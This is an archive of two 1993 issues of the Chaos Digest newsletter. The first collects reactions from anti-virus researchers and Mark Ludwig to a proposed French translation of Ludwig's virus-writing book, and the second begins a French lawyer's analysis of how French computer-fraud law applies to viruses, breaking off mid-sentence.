Chaos Digest               Lundi 4 Janvier 1993           Volume 1 : Numero 1

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.01 (4 Janv 1993)
File 1--Annonce de Presse (Reprint)
File 2--Reactions sur "C'est decide! J'ecris mon virus"

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be contacted
by
voice (+33 1 40101775), fax (+33 1 40101764) or S-mail at: Jean-Bernard
Condat,
Chaos Computer Club France [CCCF], 47 rue des Rosiers, 93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues also may
be
obtained from the mail server at jbcondat@attmail.com: all incoming messages
containing "Request: ChaosD #x.yy" in the "Suject:" field are answered (x is
the volume and yy the issue).

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views.  ChaosD
material may be reprinted for non-profit as long as the source is cited.  Some
authors do copyright their material, andthey should be contacted for reprint
permission.  Readers are encouraged to submit reasoned articles in French,
English or German languages relating to computer culture and telecommunica-
tions.  Articles are preferred to short responses.  Please avoid quoting
previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: 16 Oct 92 23:59:59 GMT
From: jbcondat@ATTMAIL.COM
Subject: File 1--Annonce de Presse (Reprint)


                    MAKING THE NEWS AND BOOKSTANDS
(From "Intelligence Newsletter", No. 202 (Oct. 8, 1992), Page 5,
by Olivier Schmidt)

The computer virus "threat" is back in the news with a new study by
IBM specialist Jeffrey O. Kephart and on the bookstands with a French
do-it-yourself build-your-own manual on viruses. According to Kephart
of IBM's High Integrity Computing Laboratory, most previous theories
on the "social structure of computer use and networks were faulty":
not every machine could make contact with every other machine in one,
two or three "steps".  Most individual computers are not connected to
others systems but only to their nearest neighbors. Therefore, most
infections take place not through networks, but through the physical
exchange of disks. Moreover, many of the 1,500 known viruses are not
good replicators and many are not destructive.  Even the remaining
good replicators are "almost all defeated by normal anti-virus
programs." To advance knowledge such as this concerning viruses, Chaos
Computer Club France (CCCF) has decided to publish the French
trans-lation of "The Black Book of Computer Virus" by Mark Ludwig
"which was censored in the U.S." (French title, "C'est decide! J'ecris
mon virus," Editions Eyrolles). This "pedagogical" effort is backed by
the European Institute for Computer Anti-Virus Research (EICAR) whose
current president is Dr. Paul Langemeyer who represents Siemens at the
EICAR. The book contains "computer codes for writing your own virus," but
according to CCCF any such virus can be defeated by normal anti-virus
programs. Moreover, there is no French law forbidding the publication of
virus computer codes. The book is intended for "responsible adults" and
bears the warning "Forbidden for readers not 18 years old".

------------------------------

From: jbcondat@ATTMAIL.COM
Date: 31 Dec 69 23:59:59 GMT
Subject: File 2--Reactions sur "C'est decide! J'ecris mon virus"

After the publication in CuD #4.52 (Sun Oct 18, 1992) of the "File
5--Making the news and Bookstands (Reprint)", I receive an incredible
number of well-argumented reactions. The French translation of the
Mark Ludwig's book, cited as followed in the Library of Congress'
general catalog

+++++
  01351245   2092974XX   STATUS: Active entry
   TITLE:  The  Little  Black  Book  of Computer Viruses, Vol. 1:
           Technical Aspects
  AUTHOR: *Ludwig, Mark A.*
  PUBLISHER: Amer Eagle Pubns Inc  PUBLICATION DATE: 02/1991 (910201)
  EDITION: Orig. Ed.   NO. OF PAGES: 192p.
  LCCN: N/A
  BINDING: pap. - $14.95
  ISBN: 0-929408-02-0
  VOLUME(S): N/A
  ORDER NO.: N/A
  IMPRINT: N/A
  STATUS IN FILE: New (90-06)
  SUBFILE:  PB  (Paperbound  Books  in Print); ST (Scientific and
    Technical Books and Serials in Print)

  PAPERBOUND  BOOK  SUBJECT  HEADINGS:  TECHNOLOGY- COMPUTERS  AND
    COMPUTER TECHNOLOGY (0000456X)
+++++

is already in France on of the most critical publication of this
winter. All weeks, some critics are available in the press... and the
Chaos Computer Club France is consider as an humor organization,
without any ethics :-)

Some e-mail reactions of so-called specialists of computer viruses are
absolute full of humor. I give you one overview of the style.


                    ACADEMIC AND WITHOUT REQUIRED-ANSWER

From: bontchev@fbihh.informatik.uni-hamburg.de (Vesselin Vladimirov Bontchev )
Date: Mon Oct 12 19:26:11 GMT 1992

> The CCCF are translate for a long times the book of Mark Ludwig you cited.
> It's not my PRIVATE initiative but one of my group.

I see... Not a good idea, IMHO...

> This book is forbidden in th US. This book will perhaps not be publish,

The book is NOT forbidden in the USA. Sorry, but your information is
wrong. I wish it were true, but it is effectively impossible to
prevent something from being published in the USA, except if it
threatens the National Security (sic) or contains plain lies (in the
latter case you still can publish it, but are running the risk to be
sued). This "freedom of press" is guaranteed by one of the amendments
to their Constitution.

In fact, Ludwig's book has been -already- published there. I have a
copy of it on my desk.

> Do you mean this French translation (proposed title: "C'est decide! J'ecris
> mon virus") will be an extremely bad think?

If you are asking about the title - I don't know. Why changing the
title? Why not just translating it to something like "Petit livre
noire de virus informatique" or something like that? (Sorry, my French
is horrible.)

If you are asking whether I think that the idea to translate the book
in French is a bad one - yes I definitively think so.

This book is harmful. There is nothing useful that the reader could
learn from it. S/he can only learn how to write viruses, and even this
is not taught properly... :-) The virus techniques described there are
old, silly, and barely work. But nevertheless they are dangerous.
Several years ago, a German called Ralf Burger has published here a
similar book, containing the sources of a few silly viruses. The virus
writing techniques discussed in Burger's book are even less effective
than the ones described in Ludwig's book. But nevertheless, the
viruses described there have been used to create hundreds of variants.
(Those viruses are Vienna, Burger, Number 1, Rush Hour...) The same
will happen with the viruses published in Mark Ludwig's book...

That's why, I consider any publicity of his "oeuvre" to be harmful. In
fact, if you translate and publish it, it will be harmful to your
reputation. After all, you are claiming that CCCF does NOT support
hacking (cracking) and virus writing, but is opposed to it. Even EICAR
might decide that you (as a member) do not conform to its constitution
and Code of Good Conduct... Remember, several years ago IFIP published
an appeal to everybody, including all publishers, to refrain from
publishing virus code.

John McAfee is master of the media shows... :-\ He does this much
better than fighting viruses... :-( The only thing that he does even
better is making money... :-)

My advice to you is: if you can stop the translation and the
publication of this book in France, do it.


                            VIOLATION OF PRIVACY

From: pelegrin@geocub.greco-prog.fr (Francois PELLEGRINI )
Date: Wed Oct 21 13:38:06 +0100 1992

  I write you give you some comments about the mail you sent me about
the brand-new CCCF book.

  I am in favor of the publication of such a book, in spite of some points
I find preoccupating:

  I am in favor of free software and information, but my concern about viruses
is that they represent a violation of privacy, all the more when they have
harmful abilities. I would be *VERY* angry should a virus blast 2 years of
work done on a hard disk. Even reinstalling a partition is time-consuming,
all the more when you cannot install bought software because they have not
been un-installed before the system crashes! To sum-up, I am in favor of the
prosecution of authors of harmful viruses. To take an example in real life:
would you like someone to enter your apartment (just because you left a
window opened once) and crash all your CDs?

  In spite of that, I find their principles of conception exceptionally
interesting and stimulating: as you must put all the replicative code on
as few bytes as possible, virus coding is to me great hack art. I believe
in such educational purposes.

  The only point which cause problems is the idea of having lots of different
viruses (not in conception, since it will be based on the book's ideas, but
in code), so that maintaining anti-virus codes will be more and more
expensive in time. By reading such a book, hackers will have big fun and will
experiment new things, but I am afraid of mere-beginners, getting proud of
writing "their" virus, which will just be a copy of what is in the book.

  As you talk of "1.500" viruses, I guess you mean PC viruses. As their input
can only happen, even in a local network area, from a magnetic media (I have
not heard about PC networks linked to the Internet), a check at the input
points (floppy-disk equipped machines) is rather secure.

  Would you have talked about Internet viruses, the danger would have been
greater (exposing the mail bugs, or similar system faults is not harmless),
as no machine can resist to an invisible Net attack.

P.S.: Just a last idea: I have read some CCC propaganda (I have one of their
books, in French, "Danger: pirates informatiques), and sometimes they prone
free access to information. Does it mean that we are allowed to copy their
book on a copy-machine, rather than buying it? People have spent time
writing books, and expect some money to pay them back for it. It is the
same thing with programs: "Don't let a virus ruin your life!".


                              MILITARY STYLE

From: WHMurray@DOCKMASTER (William Hugh Murray )
Date: Mon Oct 19 17:43:45 GMT 1992

I am generally opposed to the publication of viruses in code or in
print.  Viruses, like other ideas, once published cannot be easily
controlled.  The author has almost no control.

Viruses in code can replicate without much human help or assistance.  On the
other hand, they keep much of their design and intent concealed.
Currently, viruses in print cannot replicate without considerable human
help.  However, their intent is to make their design and intent as
obvious as possible.  This may result in even more destructive use of
the ideas.

I consider any publication of viruses in executable code to be
gratuitous at best, destructive at worst.  Particularly in print, any
legitimate objectives can be met in psuedo code.  Still, while opposed
to any publication, all other things being equal, I have a small
preference for publication in print if publish you will.

While I will attempt to discourage you from any such publication and
will shun you after the fact if you do so, I am opposed to the use of
the power of the state to restrain you.  This has almost nothing to do
with how I feel about the essentially destructive nature of your
publication.  Rather it is related to the potential for abuse of any
such power granted to the state.  While forced to trust the state to
distinguish between classes of destructive behavior, my reading of
history leaves me temporarily convinced that the state should not be trusted
to judge ideas.


                        THE DAMAGE IS ALREADY DONE

From: weber@vortex.ufrgs.br (Raul Fernando Weber )
Date: Mon Oct 19 11:25:28 EST 1992

I am not opposed to the publication of books about the problem of viruses
and other malicious programs. The end user should learn about the problem
that viruses represent to computer sciences in general. The user should
known the perils that such programs represent to his or her data. Knowing
your enemies is the best method of fighting against them.

But if a book contains source code of viruses, that is a real problem.
Anyone can then easily type the code or modify it, and very soon we will
have a greater number of new viruses to deal with. Any explanation about
viruses can easily be done in plain text or in pseudo code (without
explicit reference to a hardware platform or operating system). Authors  of
such books should be discouraged to publish complete or partial
descriptions of viruses source code.

It doesn't matter if the code published is from viruses that can be
detected and eliminated by normal anti-virus programs. If this book is read
by someone that is not a "responsible adult"', and this person writes a
virus with the information he or she gets from the book, the damage is
already done. It doesn't matter if this virus works or not, if it is a "bad
replicator" or a "benign virus"'.

In the other way, I also believe that once such a book is published, there
is nothing we can do against it, except discourage any person from buying
it, or from using the ideas to write viruses. I am against any type of
censure. It is much better to give people a good education and sense of
ethics.

I wrote articles about computer viruses (in portuguese) and I use
high-level pseudo-code in order to explain the virus routines. For
instance, in order to explain how a bootstrap virus uses stealth
techniques, I explain that the virus has the following routine:

               if trying_to_read_the boot_sector
               then show_the_original_boot_sector

This art of pseudo-code lets the reader understand how the virus work
without teaching how to write a virus. Of course, a good programmer can
translate this to assembler and write such a virus for the IBM-PC, but he
needs to understand a lot about BIOS, DOS, etc.

Giving the code in assembler form enables an unexperienced user to write a
virus, and that is exactly the crucial point! With pseudo-code you need to
be a good and experienced programmer  in order to write a virus, and I hope
that every such a programmer has also a good sense of ethics. But with
assembly listings almost everyone can, with a trial-and-error process, also
write a virus. And this kind of user can release a virus just for fun, to
see what happen with his neighbours. This possibility of "unwanted" spread
of virus scares me, and because this I am against the publication of
viruses code in general.


                       THE COUNTRY IS IRRELEVANT

From: hayes@urvax.urich.edu (Claude Bersano-Hayes )
Date: Tue Oct 20 04:52:00 EDT 1992

I first think the country is irrelevant.  France, Italy, Bantoustan... or the
USA.  The problem remains the same:  shall we as a whole have access to the
information. You probably have informations I don't.  I am less drastic than
you here. I think all depends of the info, and what one can do with it.
Knowing how to make a A-bomb is not critical, since getting plutonium is not
*that* easy.  Creating computer viruses is another matter.

Publishing a "do-it-yourself" book about viruses is at best irresponsible, and
more than likely dangerous.  But there are laws in France too. The book can be
published "legally" but its use can be dangerous for the user who get caught
creating and/or disseminating viruses.  I am not a lawyer so you may want to
check with others, but it seems to me that the publisher may be sued if a book
entices someone to do something illegal.  Suggestion:  post that same message
to Usenet's soc.culture.french.  You will probably get a few more replies.

But this does not mean I approved of the US publication either. I did not (but
was not asked ).  The self-proclamed "Dark Avenger" released his MtE
(Mutating Engine) which can be used to make "stealth" viruses (and it is
available on many BBS's here).  Not a great idea either...

Since I don't know the state of computing in Europe in general, and France in
particular, I have no idea what the impact of this book will be.

If the book is aimed at computer professionals that's another story.  These
people need to know how these little pests work.  I have no problems there.

I don't think liberty has anything to do here.  The problem is one of
publisher's resonsibility:  will this book cause harm to the computer users
at large?

I myself ran into a similar problem here in the US. I moderate a virus-
awareness group on a local BBS and a fellow user wanted to give references
about some viruses (including source code and book titles). I refused (and was
called a fascist because of that).

There is no good answer to this problem ...


                          RUSSIAN'S OFFICIAL ANSWER

From: eugene@kami.npimsu.msk.su (Kaspersky Eugene Valentinovitch )
Date: Tue Oct 20 19:31:15 GMT 1992

I think that the publications of virus sources is very bad news for me
because:

1. The difficult virus (like a stealth, polymorphic, etc) is very interesting
to analyze it and it's a very interesting job to make antiviral for this
difficult virus. This virus can be produced only by high-class programmers.
But the high-class programmer can write the virus without any smb virus
sources, without any books with the virus sources.

So who will read this book? Only the -beginners- in programming and assembler.
And these beginners can't write the virus which will be interesting to me.
They can write the millions of Vienna, Burger, Tiny viruses. At this
moment the sources of Vienna and Burger viruses are printed in West,
the source of the virus Vienna was published ever in Russia!!!. Now there are
about 50 viruses of Vienna  and 10 of Burger in my collection.
And I should to analyze them and add the information into my antiviral
database. And it's a lost time, because it's a non interesting work for me
and my boys.

It's a work for the rubbish-remover.
There is the word 'zolotarr' on Russian - it's a man who on very old years
cleaned the water-closets (on the old year there are 'closets' without
'water'). The analyze of the Vienna and Burger is the work of 'zolotarr'.
And now when I receive the new large portion of the viruses I say
for my boys: "Hey, zolotarrs! Come here! There is a new work!" :-)

So this is the 1st why the publication of the virus sources is very bad
to me: I receive a lot of not interesting work.

2. The publications of the virus sources will push some programmers to
the virus creation. If this is a beginner, see above. If it's a
good programmer he can write new very interesting virus. But I have
a lot of interesting virus! It's enough! It's about 900 analized viruses
in my collection and about 300 awaiting analyze.

So this is the 2nd: there are too much viruses, and I don't want to
receive another ones.

3. This publication is the hooliganism, because this paper can call
the damage for the computer users and not only to them. I think that it is
not needed to explain this.

It's the 3rd: I don't like the hooligans.

That's all.

About the virus-writers
+++++++++++++++++++++++
I think that the men who wrote this book are unhappy men, because they try
to make the work which is not needed to another men. They can't find
the more interesting job. It's unhappy.
I see from time to time the virus-writers. Practically all of them seens
like non-smiling boys, boys which don't like to girls...

So I think that the virus writes and virus-publishers are unfortunately
because the good man don't writes the viruses.

About France
++++++++++++
You asked me about France only. Why only France? I think it's a problem
of all the countries.

Yes, the France, Spain, ... are non-computer countries, I don't know why.
I remember 2 French programs only: exe-file-compresser LZEXE and the game ...
I forgot the name... the game about prisoner. Ha! the name of this game -EDEN.

That's all. I think that the love to computers - it is a national peculiarity.

The French programmers can write intelligent virus, but probability of
this is a little.

But the USA, UK, Russia (yes, Russia!) - there are the computer countries.
And there are a lot of high-level programmers, a lot of programmer-hooligans
too, especially in Russia :-(.

About free information
++++++++++++++++++++++
There are the range of the information freedom: from "don't write
about viruses!!!" till "write all about them including the source".
I think the better way for the virus information is the middle of this range.
I have about 10 publications in 2 books, Russian computer magazines, Russian
newspapers and I try to say the interesting information about viruses
but so that this information can't be used while programming the new viruses.

P.S. Sorry my English, all the people in Russia told only on Russian - I
don't know why... ;-)


                     BECOMING UPSET, ANGRY AND HURT

From: mcafee@netcom.COM (McAfee Associates )
Date: Tue Oct 20 21:19:11 -0700 1992

I'm glad to be of assistance to you.  I think that most people in the anti-
virus community view Mr. Ludwig's book with considerable distaste.  Mr.
Ludwig does not seem to recognize the fact that he is making all of our
lives more difficult by teaching people how to write computer viruses.  I
am not a programmer, nor am I a lawyer or a businessman.  I provide technical
support for people who have a computer infected with a virus (or suspect that
they have one).  These are people who become upset, angry, and hurt because
they have gotten a virus from some source.  And I don't think people should
have to suffer just so someone can show off his (her) programming skills or
prove that he can print virus source code and sell it safely behind the laws
of his own country.

Please bear in mind that I am not a lawyer, nor do I have a background in
international shipping or publishing.

I would strongly recommend that you contact the U.S. Department of Commerce
or at least the U.S. consulate in Paris.  They should be able to provide you
with all information required to import Mr. Ludwig's book into France and
publish it there.

I would also strongly recommend that you check with a lawyer that specializes
in high-tech crime issues as well as the high-tech crime bureau of your local
police department to make sure that no laws our broken by its publication.  If
your local police department does not have a high-tech crime bureau, I would
recommend that you try contacting the national police.

When talking with your lawyer, I would recommend that you ask him (or her)
about your legal exposure:  You (or CCCF) could be held responsible for
damages caused by the viruses, even if you include a disclaimer.


                        IRRESPONSIBLE ATTITUDE

From: rslade@sfu.ca (Robert Slade )
Date: Sat Oct 17 13:20:55 PDT 1992

I am strongly tempted to reply that your posting is stupid, and an obvious
attempt to justify an irresponsible attitude. However, giving you the benefit
of the doubt, I will try to restrain myself.

You try to take the "high moral ground" by implying that the publication of
this book will assist users to protect themselves. While I acknowledge that
"good" books on protection against viral programs are hard to find, Ludwig's
book is definitely not the answer. It is certainly no better in that regard
than many other available works.

You attempt to downplay the damage that can be done is unrealistic.  While
agreeing that Ludwig's code is simplistic and easily countered by reasonable
protection, but, as you note, the vast majority of users have *no* protection.
In addition, the new viral programs thus generated require a lot of extra
effort on the part of the anti-viral researchers to weed out these additional,
if stupid, viral programs.


                           PUBLISH THE BOOK

From: ygoland@SEAS.UCLA.EDU ("Yaron Y. Goland" )
Date: Tue Oct 20 22:13:39 PDT 1992

Accepting for the moment that it is indeed legal to publish this
book in France, the question at hand is if it is 'right' to publish
this book. I believe this is the wrong question. Is the computer
virtual community to act as a self censor? Should we not say what we
know for fear of 'educating' others? Any time we restrict ourselves
in this manner we limit our freedom and the freedom of everyone
around us. Information is, in itself, not dangerous. It simply is.
It is the use that the information is put to that determines it's
'correctness'. Publish the book. To not do so is to do nothing more
than carry on the irrational fear of viruses and more importantly it
will strike another blow against the various forms of 'self
censorship' which is now practiced within the community. Silence
breeds fear, not knowledge.
                                The Jester



                                CONCLUSIONS

From: Mark A. Ludwig
      (Amer. Eagle Publications, Inc., PO Box 41401, Tucson, AZ 85717;
      Phone: (602) 888-4957)
Date: Thu Oct 22 22:17:29 -0700 1992

So you have found out that _The Little black Book_ is controversial! If you
ask the so-called "experts" in viruses, guys like Skulason, or David Stang, or
Alan Solomon, they'll tell you they hate the book, and it shouldn't be
published. And they are smart enough to avoid saying "don't buy it" so they
use a classic Soviet-style disinformation tactic that they've dreamed up and
call the code in the book "junk," etc., to try to make people think it isn't
worth their while to buy it. That's a lie, and I've had people in the industry
tell me so, off the record. I know the code is good, and it works, period.
The only "bugs" are as discussed in the book. Now, there isn't anything cute
or tricky about the code, and maybe some people call it junk because it isn't
an attempt to intimidate the reader, as a Whale-style ultra-cryptic virus
would be, etc. These viruses were written purely as instructional examples,
and they are straightforward and functional examples, and not an attempt to
demonstrate to the world how clever I am.

My counter-tactic to this disinformation is to simply ignore the nay-sayers
and advertise the book. Plenty of people absolutely love it and buy it and
talk about it to their friends.  The fact is the little guys who aren't
already virus experts want to become more expert in this area. They have good
reason for it. They need to understand viruses and be able to combat them from
a position of knowledge and not ignorance. The so-called experts don't want
the little guys to be expert.  They'd rather the little guys keep feeding off
of them.  And the more the little guys read the book, the more they will quit
trusting the establishment anti-viral types.

I can send you a packet of unsolicited letters from people who have really
liked the book if you or the publisher needs to see them before going ahead.

I can guarantee you that the book will probably be as controversial in France
as it has been in the US.  People will love it and people will hate it. Nobody
will be indifferent. My goal in this whole thing is to win a battle with the
people who want to keep viruses secret, and I am going to do it.

I must say I was somewhat surprised that a major publisher like Eyrolles was
ready to buy into the book--if French publishers are anything like their
American counterparts.  Technical publishers here are extremely conservative
and try to avoid controversy as much as possible. If they are having reserva-
tions about publishing it i would not be surprised.

Please publishe it!

------------------------------

End of Chaos Digest #1.01
************************************

Chaos Digest              Lundi 11 Janvier 1993            Volume 1 : Numero 2

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.02 (11 Janv 1993)
File 1--Virus, les Implications Legales

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be contacted
by
voice (+33 1 40101775), fax (+33 1 40101764) or S-mail at: Jean-Bernard
Condat,
Chaos Computer Club France [CCCF], 47 rue des Rosiers, 93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues also may
be
obtained from the mail server at jbcondat@attmail.com: all incoming messages
containing "Request: ChaosD #x.yy" in the "Suject:" field are answered (x is
the volume and yy the issue).

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views.  ChaosD
material may be reprinted for non-profit as long as the source is cited.  Some
authors do copyright their material, andthey should be contacted for reprint
permission.  Readers are encouraged to submit reasoned articles in French,
English or German languages relating to computer culture and telecommunica-
tions.  Articles are preferred to short responses.  Please avoid quoting
previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

From: Maitre Olivier ITEANU, Avocat a la Cour d'Appel de Paris
Date: Mon Nov 4 12:16:00 EDT 1992
Subject: File 1--Virus, les Implications Legales
Copyright: Avec l'aimable autorisation de l'auteur

"Les virus informatiques existent: il ne s'agit pas d'OVNI, il s'agit de la
vie,
de la chair et du sang de nos ordinateurs".

La violence des propos tenus dans le livre de Richard B. LEVIN, "The computer
virus handbook", illustre parfaitement l'attitude generalisee constatee,
dans les societes industrialisees, a l'encontre de ce nouveau mal du 20eme
siecle, le virus informatique.

Le virus informatique fascine. L'identite terminologique avec le virus
biologique, qui fait que les termes medicaux abondent en la matiere--on evoque
ainsi regulierement, a propos des virus informatiques, les "infections", les
"vaccins" ou "antidotes", certaines grandes entreprises evoquant meme a propos
des mesures de securite "des mesures d'hygiene"--est sans doute une des
explications de cette fascination, repercutee et amplifiee par les medias.

Le virus informatique fascine tous les agents economiques de notre societe,
des
developpeurs de logiciels aux utilisateurs en passant par les editeurs, tant
les individus que les entreprises, et les moyens de defense pour le combattre
sont avant tout techniques, avec au premier rang, les anti-virus.

Existe t'il cependant une reponse juridique a la propagation des virus
informatiques? Quelles sont les consequences juridiques, les implications
legales, de la diffusion d'un virus? Le porteur sain, celui qui transmet un
logiciel infecte en toute bonne foi, verra t'il sa responsabilite engagee?

Telles sont, en substance, les principales questions auxquelles nous allons
tenter de repondre, aux vues du droit positif francais et, notamment, des cas
juges interessant la fraude informatique et les virus.


1.  QUELLE REACTION LEGALE FACE AU VIRUS INFORMATIQUE?

1.1  Droit civil / droit penal

Dans un Etat de droit, notamment en France, la societe et les individus qui la
composent, disposent toujours, lorsqu'ils subissent une atteinte a leurs biens
ou a leur personne, d'une alternative entre la voie penale et la voie civile
pour obtenir la condamnation du coupable et une eventuelle reparation.

Les deux voies, ou plutot les deux droits, civil et penal, different
fondamentalement quant a l'objectif recherche.

Le droit civil a un caractere strictement compensatoire puisqu'il regit les
interets prives et organise la reparation des prejudices individuels subis par
les individus ou sujets de droit.

Le droit penal, au contraire, defend l'ordre social, la societe, et expose,
celui qui a commis l'acte, a une peine ou a une mesure de surete.

C'est le droit penal qui precise les elements, legal materiel et moral, dont
la
reunion est indispensable pour qu'une infraction soit legalement constituee.

En France, la classification des infractions est fondee sur la rigueur de la
peine et non sur la gravite de l'acte.

L'infraction est, soit une contravention si elle est punie d'une peine
contraventionnelle, soit un delit si elle est punie d'une peine
correctionnelle,
soit un crime si elle est punie d'une peine de reclusion a perpetuite ou a
temps, de detention criminelle ou a temps, d'un bannissement ou de la
degradation civique.

Chaque infraction a son Tribunal: le Tribunal de Police pour les
contraventions,
le Tribunal correctionnel, compose de magistrats professionnels, pour les
delits, la Cour d'assise, composee d'un jury populaire, pour les crimes et la
procedure prealable au jugement, devant ces Tribunaux, differe selon le type
d'infractions.

Ainsi, l'instruction, phase au cours de laquelle le juge dit d'instruction
rassemble les preuves de l'infraction, est obligatoire pour les crimes,
facultative pour les delits, a la seule requete du Procureur de la Republique
pour les contraventions.

Enfin, le fond des regles de droit differe selon le type d'infractions. C'est
ainsi, que, par exemple, la complicite est toujours punie en matiere de crime
et de delit, jamais en matiere de contravention. La tentative est toujours
punie
en matiere de crime, lorsque la loi le prevoit expressement en matiere de
delit,
jamais en matiere de contravention.

La diffusion de virus peut-etre source de responsabilite civile et penale,
dans
des conditions que nous allons ci-apres exposees.

1.2  Pas de sanctions penales sans textes

En France, le droit penal est gouverne par, notamment, un principe
fondamental,
le principe de la legalite des delits et des peines qui fait de la loi un
element de l'infraction.

En application de ce principe, un acte ne peut etre penalement reprime s'il
n'est deja vise et sanctionne par une loi penale existante.

Le droit francais differe ici fondamentalement du droit anglo-saxon et de la
"common law" qui confere au juge un pouvoir createur.

En France, il ne peut y avoir de sanctions penales sans textes deja existant
au
moment de la commission de l'infraction.

De meme, un acte contraire a l'ordre social, non prevu par la loi, n'est pas
punissable par voie d'analogie avec un acte similaire ou identique, comme dans
certaines autres legislations penales comme la loi Danoise (Code Penal Danois
de 1930, article 1).

Ce principe doit conduire le legislateur a anticiper les nouveaux actes anti-
sociaux puisque, de surcroit, en vertu du principe de non retroactivite de la
loi, le texte repressif doit exister au moment de la commission de
l'infraction.

Avec un tel systeme, les risques "d'accidents", du fait d'un vide juridique,
sont toujours possibles.

C'est ainsi qu'en 1987 et 1988, cinq directeurs de services telematiques
(minitels) offrant chacun un service de messageries interactives dites "roses"
aux minitellistes, promotionnes a grand renfort de publicite, furent
poursuivis
et inculpes par un juge d'instruction, pour "incitation a des occasions de
debauche". Or, la 17eme chambre correctionnelle du Tribunal de Grande Instance
de PARIS ne put que constater l'absence de textes legaux reprimant ce type de
comportement, au moment de la commission des actes, et relaxa, en consequence,
les prevenus par une decision datee du 4 juillet 1988. Le jugement fut
confirme par la Cour d'Appel de PARIS.

Pour combattre penalement les virus informatiques il convenait alors que des
textes repressifs soient votes.

Face au peril que represente les virus informatiques, et plus generalement la
fraude informatique, le legislateur francais a choisi tres vite de proteger la
societe et son ordre social en dotant le Code Penal de nouveaux textes
repressifs charges de punir, notamment, les auteurs de virus dans certains de
leurs comportements.

C'est la loi du 5 janvier 1988, qui ajoute au Code Penal existant huit
nouveaux
articles, numerotes #462-2 a #462-9.


1.3  La loi du 5 janvier 1988, sur la fraude informatique

La Loi du 5 janvier 1988 sur la fraude informatique, dite loi "Godfrain", du
nom
de son initiateur, le depute de l'Aveyron, Monsieur Jacques GODFRAIN, s'est
fixee pour objectif de reprimer specifiquement les agissements portant
atteinte
aux systemes informatiques, pris au sens large du terme.

Cette loi ajoute au Code Penal napoleonien de 1810, huit nouveaux articles,
dont
trois en particulier peuvent concerner les virus.

Article #462-2 du Code Penal:
Cet article du Code Penal sanctionne l'intrusion dans un systeme informatique,
c'est a dire l'acces indu, sur la machine ou a distance, et le maintien indu
dans le systeme, prolongement de l'acces indu ou maintien frauduleux apres
acces
par erreur ou maintien dejouant les controles pour ne pas payer le prix par
exemple.

Les peines encourues, pour ce type d'infraction, sont de deux mois a un an
d'emprisonnement et/ou une amende de 2.000 F a 50.000 F, portees a une amende
de 10.000 F a 100.000 F et a un maximum d'emprisonnement de deux ans, en cas
de
suppressions ou de modifications de donnees.

Les suppressions ou modifications de donnees visees par l'article #462-2 sont
la
consequence de l'acces ou du maintien indu et sont ici entendues comme etant
des
atteintes involontaires aux donnees.

Si ces suppressions ou modifications etaient volontaires, il conviendrait de
faire application des articles #462-3 et #462-4 du code Penal.

Article #462-3:
"Quiconque aura, intentionnellement et au mepris des droits d'autrui, entrave
ou fausse le fonctionnement d'un systeme de traitement automatise de donnees
sera puni d'un emprisonnement de trois mois a trois ans et d'une amende de
10.000 F a 100.000 F ou de l'une de ces deux peines."

C'est, de maniere evidente, ce texte qu'il convient d'appliquer pour toutes
les
interferences imaginables qui peuvent affectes un systeme informatique, et
notamment, l'insertion de bombes logiques ou, bien evidemment, l'insertion de
virus.

Le virus, en effet, "par essence" entrave et meme plutot fausse, c'est a dire
une action positive, le fonctionnement des systemes qu'il incorpore.

Article #462-4:
Cet article traite, quant a lui, des atteintes aux donnees.

Il faut noter que de nombreux commentaires de la loi mettent l'accent sur le
fait que cet article se chevauche avec le precedent, puisque le fait de porter
atteinte aux donnees participe, indiscutablement, d'une operation tendant a
entraver ou, plutot, fausser le fonctionnement du systeme.

Les deux articles, #462-3 et #462-4, sont sanctionnes des memes peines
d'emprisonnement.

La encore, le cas des virus peut etre traite par l'article #462-4.


1.4  Les regles de la responsabilite civile de droit commun

Tout delit penal est un delit civil: le contraire n'est pas forcement vrai.

En application de dispositions fondamentales du code civil, les articles 1382
et 1383 du code Civil, la responsabilite civile de toute personne peut etre
engagee si trois conditions sont remplies:
- un prejudice subi par la victime,
- une faute de l'auteur du delit civil,
- un lien de causalite entre le prejudice subi et la faute.

Rapporte au virus informatique, il est des lors evident que l'ensemble des
actes vises par la loi penale peuvent donner lieu a action civile devant les
Tribunaux, autonome ou jointe a l'action penale.



2.  LES VIRUS SOUS LE COUP DE LA LOI PENALE?

Comme il a ete vu ci-avant, certains agissements relatifs aux virus sont punis
comme etant des actes criminels.

Il s'agit desormais de comprendre dans quelles conditions.

Le crime, au sens large du terme, se definit comme etant l'action ou
l'omission
d'un individu, qui, a raison du trouble qu'elle cause a l'ordre social, est
frappee par la societe d'une sanction penale.


2.1  L'individu: la typologie des delinquants

Le crime est une realite humaine.

Ce rappel est d'autant plus important que, s'agissant des virus, l'imagerie
populaire, traduite en cela par les medias, occulte totalement l'auteur du
virus pour ne retenir que son instrument, le programme d'ordinateur baptise
virus, ses performances et ses caracteristiques, .

Or, bien combattre un acte antisocial, c'est avant tout bien comprendre ses
causes et les causes de la criminalite relative aux virus se trouvent en
l'homme.

On distingue habituellement, d'une part, les facteurs interieurs a l'individu,
dits endogenes, avec les caracteres dits innes (l'heredite, le sexe ... etc)
qui, dans le cas des virus, ne semblent pas determinants.

D'autre part, les facteurs exterieurs a l'individu, dits exogenes, tels le
milieu (geographie, climat, etc.), la demographie (la criminalite des villes
n'est pas celle des campagnes), la situation familiale, la situation
